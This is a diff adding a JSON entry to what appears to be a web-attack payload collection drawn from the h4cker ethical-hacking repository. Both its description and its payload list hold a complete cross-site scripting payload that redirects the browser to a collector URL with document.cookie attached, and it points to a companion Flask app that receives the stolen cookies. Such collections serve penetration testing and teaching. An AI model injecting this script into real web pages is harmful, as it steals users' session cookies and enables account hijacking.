@@ -1,0 +1,15 @@
+{
+  "id": "temp_0ee42f12f5e8",
+  "category": "temp",
+  "title": "cookie stealer payload",
+  "description": "# Cookie Stealer Payload\nThis is the payload that can be used with the [cookie stealer Python/Flask app](https://github.com/The-Art-of-Hacking/h4cker/blob/master/python-ruby-and-bash/cookie_stealer.py).\n\n```\n<script type=\"text/javascript\">document.location=\"http://127.0.0.1:1337/?c=\"+document.cookie;</script>\n```\n",
+  "payloads": [
+    "# Cookie Stealer Payload",
+    "This is the payload that can be used with the [cookie stealer Python/Flask app](https://github.com/The-Art-of-Hacking/h4cker/blob/master/python-ruby-and-bash/cookie_stealer.py).",
+    "<script type=\"text/javascript\">document.location=\"http://127.0.0.1:1337/?c=\"+document.cookie;</script>"
+  ],
+  "source": "h4cker",
+  "references": [
+    "/workspaces/hunter-skill/h4cker/temp/Ethical_Hacking/Attacks_and_Exploits/Web_Application_Attacks/web_application_testing/cookie_stealer_payload.md"
+  ]
+}
